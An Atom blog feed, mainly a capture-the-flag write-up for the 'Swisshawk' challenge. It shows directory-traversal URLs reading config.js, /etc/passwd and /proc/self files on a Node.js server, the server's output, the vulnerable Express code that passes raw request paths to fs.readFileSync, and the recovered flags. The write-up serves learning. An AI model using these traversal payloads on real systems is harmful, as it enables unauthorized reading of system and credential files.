<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

 <title>sin9yt</title>
 <link href="http://localhost:4000/atom.xml" rel="self"/>
 <link href="http://localhost:4000/"/>
 <updated>2018-01-30T02:00:29+05:30</updated>
 <id>http://localhost:4000</id>
 <author>
   <name>Sindhoor Tilak</name>
   <email>sindhoor@sin9yt.net</email>
 </author>

 
 <entry>
   <title>Gawds CTF/ Swisshawk</title>
   <link href="http://localhost:4000/2018/01/21/gawds-ctf-swisshawk.html"/>
   <updated>2018-01-21T00:00:00+05:30</updated>
   <id>http://localhost:4000/2018/01/21/gawds-ctf-swisshawk</id>
   <content type="html">&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;

&lt;p&gt;This challenge seemed easy in the beginning. The second part of challenge had me breaking my head, 
it made me learn a new vector in post-exploitation of web apps.&lt;/p&gt;

&lt;p&gt;Your friend Tamanna is in danger, swisshawk defaced her website and hidden some flags in there.&lt;/p&gt;

&lt;p&gt;Tamanna can only restore the website if she knows the flags, please help tamanna get her website back!&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://swisshawk.ctf.gawds.in&quot;&gt;http://swisshawk.ctf.gawds.in&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;the-challenge&quot;&gt;The Challenge&lt;/h2&gt;

&lt;p&gt;The challenge in a sense was quite straight forward. Opening the page greets you with a steady message.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://sin9yt.net/public/images/startup-swisshack.png&quot; alt=&quot;Challenge&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As always the entry point being the source, I decided to give it a look.&lt;/p&gt;

&lt;pre&gt;&lt;p&gt;You will never be able to find the flags, I have very carefully
        hidden it somewhere here &amp;lt;!-- page: /app path: /config.js --&amp;gt;&lt;/p&gt;&lt;/pre&gt;

&lt;p&gt;Looking at the comment it was evident that it was a node.js application.&lt;/p&gt;

&lt;p&gt;From the hint, the page was currently in the &lt;code class=&quot;highlighter-rouge&quot;&gt;app&lt;/code&gt; directory. We have to go to the root directory to access the &lt;code class=&quot;highlighter-rouge&quot;&gt;config.js&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;Navigating to the following page:&lt;/p&gt;
&lt;pre&gt;http://swisshawk.ctf.gawds.in/../config.js&lt;/pre&gt;

&lt;pre&gt;&lt;p&gt;module.exports = {
    PORT: process.env.PORT || 3000,
    flag1: 'flag{F1R5T_FL4G_W45NT_THAT_H4RD}',
    flag2: 'you_cant_find_me(I am the server)'
}
&lt;!-- page: /config.js path: /config.js --&gt;&lt;/p&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Flag1: flag{F1R5T_FL4G_W45NT_THAT_H4RD} &lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;phase-ii&quot;&gt;Phase II&lt;/h2&gt;

&lt;p&gt;Now challenge was finding the second flag. The hint too was very cryptic.&lt;/p&gt;
&lt;blockquote&gt;you_cant_find_me(I am the server)&lt;/blockquote&gt;

&lt;p&gt;The hint meant flag was present inside the server’s directory.&lt;/p&gt;

&lt;p&gt;I tried directory traversal. It being a node.js app, I tried various combinations of the entry points like &lt;code class=&quot;highlighter-rouge&quot;&gt;app.js&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;index.js&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;http://swisshawk.ctf.gawds.in/../index.js
http://swisshawk.ctf.gawds.in/../app.js
http://swisshawk.ctf.gawds.in/app.js
http://swisshawk.ctf.gawds.in/index.js
&lt;/pre&gt;

&lt;p&gt;I then tried loading the &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;
&lt;pre&gt;http://swisshawk.ctf.gawds.in/../../../../../../../../../../../etc/passwd&lt;/pre&gt;

&lt;p&gt;First breakthrough!&lt;/p&gt;

&lt;pre&gt;
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
u57400:x:57400:57400:,,,:/app:/bin/bash
dyno:x:57400:57400:,,,:/app:/bin/bash
&amp;lt;!-- page: /etc/passwd path: /config.js --&amp;gt;
&lt;/pre&gt;

&lt;p&gt;But it still was a dissapointment, I wasn’t able to access any of the server files. I went to as far as looking in the &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/&lt;/code&gt; directory.&lt;/p&gt;

&lt;p&gt;I came across an article which discussed about post exploitation techniques after a LFI vulnerability.&lt;/p&gt;

&lt;p&gt;One interesting place to look for was the &lt;code class=&quot;highlighter-rouge&quot;&gt;/proc/&lt;/code&gt; directory. This directory not only contained each process related files as well as file descriptors.&lt;/p&gt;

&lt;p&gt;Each process has a directory named by its &lt;strong&gt;process id (pid).&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The shortcut being, it isn’t necessary to know the process id to access the directory. The current process directory can be accessed by navigating to the &lt;code class=&quot;highlighter-rouge&quot;&gt;/proc/self/&lt;/code&gt; directory.&lt;/p&gt;

&lt;p&gt;This directory contains four juicy files:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;environ&lt;/li&gt;
  &lt;li&gt;cmdline&lt;/li&gt;
  &lt;li&gt;maps&lt;/li&gt;
  &lt;li&gt;mountinfo&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Trying each file: &lt;code class=&quot;highlighter-rouge&quot;&gt;http://swisshawk.ctf.gawds.in/../../../../../../../proc/self/environ/&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;
SHLVL=1 HOME=/app
PORT=41335PS1=\[\033[01;34m\]\w\[\033[00m\] \[\033[01;32m\]$ \[\033[00m\]
VERSION=v6.12.3
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NPM_VERSION=3PWD=/appDYNO=web.1NODE_CHANNEL_FD=3
&amp;lt;!-- page: /proc/self/environ path: /config.js --&amp;gt;&lt;/pre&gt;

&lt;p&gt;Nothing great.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://swisshawk.ctf.gawds.in/../../../../../../../proc/self/cmdline/&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;
/usr/bin/nodeyou_cant_find_me.js
&amp;lt;!-- page: /proc/self/cmdline path: /config.js --&amp;gt;
&lt;/pre&gt;

&lt;p&gt;We found the entry point of the node.js application.&lt;/p&gt;

&lt;pre&gt;
const express = require(&quot;express&quot;);
const config = require(&quot;../config&quot;);
const flag2 = require(&quot;../flag2isHere&quot;);
const resolve = require(&quot;path&quot;).resolve;
const fs = require(&quot;fs&quot;);

const app = express();

app.use((req, res) =&amp;gt; {
    const path = req.originalUrl.substring(1).replace('%2f', '/').replace('%2F', '/');

    let text = `You will never be able to find the flags, I have very carefully
        hidden it somewhere here`;
    if(path) {
        try {
            text = fs.readFileSync(path);
        }
        catch(err) {
            text = err;
        }
    }

    text += &quot;&amp;lt;!-- page: &quot; + resolve(path) + &quot; path: /config.js --&amp;gt;&quot;;
    return res.end(&quot;&amp;lt;p&amp;gt;&quot; + text + &quot;&amp;lt;/p&amp;gt;&quot;);
});

app.listen(config.PORT, () =&amp;gt; {
    console.log(&quot;Wohooo, all set up, listening on &quot;, config.PORT);
})&amp;lt;!-- page: /app/you_cant_find_me.js path: /config.js --&amp;gt;
&lt;/pre&gt;

&lt;p&gt;We find that &lt;code class=&quot;highlighter-rouge&quot;&gt;../flag2isHere&lt;/code&gt; is the js file containing the flag.&lt;/p&gt;

&lt;p&gt;Going to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://swisshawk.ctf.gawds.in/../flag2isHere.js&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;
&lt;p&gt;module.exports = {
    flag: &quot;ZmxhZ3tUSElTX20xR2hUX0g0dkVfQjMzbl9MMVR0TGVfdFIxY2tZfQ==&quot;
}&amp;lt;!-- page: /flag2isHere.js path: /config.js --&amp;gt;&lt;/p&gt;
&lt;/pre&gt;

&lt;p&gt;We get the base-64 encoded string. Decoding it we get the following flag.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Flag2: flag{THIS_m1GhT_H4vE_B33n_L1TtLe_tR1ckY}&lt;/strong&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Under Construction!</title>
   <link href="http://localhost:4000/2018/01/15/stay-tuned.html"/>
   <updated>2018-01-15T00:00:00+05:30</updated>
   <id>http://localhost:4000/2018/01/15/stay-tuned</id>
   <content type="html">&lt;p&gt;Stay tuned, dropping 1st Feb!&lt;/p&gt;
</content>
 </entry>
 

</feed>
